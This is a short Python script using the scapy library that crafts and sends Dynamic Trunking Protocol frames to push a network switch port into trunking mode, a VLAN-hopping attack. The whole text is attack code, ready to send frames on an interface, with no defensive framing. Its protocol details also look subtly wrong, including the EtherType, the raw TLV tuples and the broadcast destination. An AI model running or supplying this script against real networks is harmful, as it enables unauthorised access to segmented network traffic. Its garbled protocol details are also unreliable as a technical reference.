from scapy.all import *
from scapy.contrib.dtp import DTP

def dtp_attack(target_mac, iface):
    # Craft a DTP packet to force trunking mode
    dtp_frame = Ether(dst=target_mac, src=RandMAC(), type=0x2004) / \
                DTP(tlvlist=[(0x01, b"\x03\x04\x01\x00\x00\x00")])

    # Send the crafted DTP packets
    sendp(dtp_frame, iface=iface, count=10, inter=0.5)
    print(f"DTP attack launched on interface {iface}")

dtp_attack("ff:ff:ff:ff:ff:ff", "eth0")
